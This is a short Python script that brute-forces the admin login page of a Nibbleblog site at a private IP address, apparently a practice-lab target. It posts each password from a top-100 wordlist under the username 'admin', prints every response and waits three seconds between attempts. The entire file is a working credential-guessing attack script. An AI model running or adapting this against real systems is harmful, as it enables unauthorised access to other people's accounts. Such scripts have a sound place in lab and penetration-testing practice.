#!/usr/bin/env python

import requests
import time

target = "http://10.10.10.75/nibbleblog/admin.php"

with open("/home/spring/tools/wordlists/passwords/top100.txt") as f:
    for line in f:
        line = line.strip()
        resp = requests.post(target, data={"username": "admin", "password": line})
        print(resp.text)
        time.sleep(3)
